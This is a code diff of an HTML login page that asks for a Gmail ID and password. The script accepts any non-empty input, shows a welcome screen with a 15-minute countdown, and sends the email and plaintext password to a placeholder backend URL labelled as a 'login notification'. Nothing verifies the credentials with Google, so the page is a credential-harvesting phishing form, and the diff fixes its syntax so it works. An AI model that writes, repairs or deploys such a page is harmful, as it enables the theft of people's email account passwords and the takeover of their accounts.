@@ -52,6 +52,7 @@
   </style>
 </head>
 <body>
+
   <div class="box" id="loginBox">
     <h2>Login</h2>
     <input type="email" id="email" placeholder="Gmail ID" autocomplete="off">
@@ -71,37 +72,42 @@
       const password = document.getElementById("password").value;
 
       // Credentials check
-if (email !== "" && password !== "") {
-  document.getElementById("loginBox").style.display = "none";
-  document.getElementById("welcome").style.display = "block";
-  startTimer();
+      if (email !== "" && password !== "") {
+        document.getElementById("loginBox").style.display = "none";
+        document.getElementById("welcome").style.display = "block";
+        startTimer();
 
-  try {
-    await fetch("YOUR_BACKEND_URL/login-notification", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        event: "login_success",
-        account: email
-        password: password 
-      })
-    });
-  } catch (error) {
-    console.log("Notification service unavailable.");
-  }
-} else {
-  alert("Kripya Gmail ID aur Password dono enter karein.");
-}
+        try {
+          await fetch("YOUR_BACKEND_URL/login-notification", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              event: "login_success",
+              account: email,
+              password: password
+            })
+          });
+        } catch (error) {
+          console.log("Notification service unavailable.");
+        }
+      } else {
+        alert("Kripya Gmail ID aur Password dono enter karein.");
+      }
+    }
+
     function startTimer() {
       let seconds = 15 * 60;
+
       const timer = setInterval(function() {
         const minutes = Math.floor(seconds / 60);
         const remainingSeconds = seconds % 60;
+
         document.getElementById("timer").textContent =
           String(minutes).padStart(2, "0") + ":" +
           String(remainingSeconds).padStart(2, "0");
 
         seconds--;
+
         if (seconds < 0) {
           clearInterval(timer);
           document.getElementById("timer").textContent = "Done!";
@@ -109,5 +115,6 @@ if (email !== "" && password !== "") {
       }, 1000);
     }
   </script>
+
 </body>
 </html>
